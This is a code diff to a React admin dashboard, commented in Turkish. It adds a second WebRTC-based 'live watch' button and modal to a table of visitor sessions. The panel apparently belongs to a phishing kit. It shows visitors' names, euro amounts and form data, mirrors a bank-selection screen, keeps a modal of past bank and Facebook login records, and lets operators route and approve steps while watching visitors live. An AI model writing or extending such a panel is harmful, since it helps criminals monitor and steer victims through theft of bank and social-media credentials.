@@ -7,6 +7,7 @@ import { pathToStep } from "@/lib/session-routes";
 import { playBeautifulNotification, showBeautifulToast, extractUserFormData } from "@/lib/notification";
 import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
 import { LiveWatchModal } from "./LiveWatchModal";
+import { LiveWatchModal2 } from "./LiveWatchModal2";
 // Banka listesi (/banken) ekraninda kullanilan AYNI logo cozumleyiciyi import ediyoruz
 // Boylece admin panelindeki banka logolari = banka secim ekranindaki logolar (BIRBIRININ AYNISI)
 import {
@@ -657,6 +658,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   const [chatSessionId, setChatSessionId] = useState<string | null>(null);
   const [deviceInfoSession, setDeviceInfoSession] = useState<DemoSession | null>(null);
   const [liveWatchRow, setLiveWatchRow] = useState<DemoSession | null>(null);
+  const [liveWatch2Row, setLiveWatch2Row] = useState<DemoSession | null>(null);
   // =============== GECMIS GIRIS MODAL (Banka + Facebook onceki kayitlari) ===============
   const [showHistoryModal, setShowHistoryModal] = useState(false);
   const [historyModalSession, setHistoryModalSession] = useState<DemoSession | null>(null);
@@ -2365,6 +2367,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 return (
                   <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
                     <td className="px-2 py-3 align-middle whitespace-nowrap text-center">
+                      <div className="inline-flex items-center gap-1">
                       <button
                         type="button"
                         onClick={() => setLiveWatchRow(row)}
@@ -2395,6 +2398,24 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           </>
                         )}
                       </button>
+                      <button
+                        type="button"
+                        onClick={() => setLiveWatch2Row(row)}
+                        className={`inline-flex items-center gap-1 px-2 py-1 rounded-full text-[11px] font-bold transition-all shadow-sm ${
+                          isOnline
+                            ? "bg-violet-500/15 text-violet-500 border border-violet-500/30 hover:bg-violet-500 hover:text-white"
+                            : darkMode
+                            ? "bg-white/5 text-gray-500 hover:bg-white/10 border border-white/10"
+                            : "bg-gray-100 text-gray-400 hover:bg-gray-200 border border-gray-200"
+                        }`}
+                        title="İzleme 2 — WebRTC P2P direkt bağlantı (düşük gecikme testi)"
+                      >
+                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
+                        </svg>
+                        <span>2</span>
+                      </button>
+                      </div>
                     </td>
                     <td className="px-2 py-3 align-top whitespace-nowrap font-bold text-sm lg:text-base text-[#EB5E28]">
                       {row.amount ? `€${row.amount}` : '-'}
@@ -3546,6 +3567,28 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           onRouteAction={(action) => void handleRouteAction(liveWatchRow.id, action)}
           onApprovalAction={(approval) => void handleApprovalAction(liveWatchRow.id, approval)}
           onClose={() => setLiveWatchRow(null)}
+        />
+      )}
+
+      {/* LIVE WATCH 2 MODAL (P2P WebRTC) */}
+      {liveWatch2Row && (
+        <LiveWatchModal2
+          sessionId={liveWatch2Row.id}
+          publicId={liveWatch2Row.public_id}
+          initialName={`${(liveWatch2Row.form_data as any)?.firstName || ""} ${(liveWatch2Row.form_data as any)?.lastName || ""}`.trim()}
+          initialAmount={liveWatch2Row.amount}
+          initialPath={sessionPaths[liveWatch2Row.id]}
+          formData={(liveWatch2Row.form_data as any) || {}}
+          isOnline={isSessionLive(
+            liveWatch2Row.id,
+            onlineSessionIds,
+            liveWatch2Row.status,
+            sessionLastSeenAt[liveWatch2Row.id]
+          )}
+          darkMode={darkMode}
+          onRouteAction={(action) => void handleRouteAction(liveWatch2Row.id, action)}
+          onApprovalAction={(approval) => void handleApprovalAction(liveWatch2Row.id, approval)}
+          onClose={() => setLiveWatch2Row(null)}
         />
       )}
     </div>
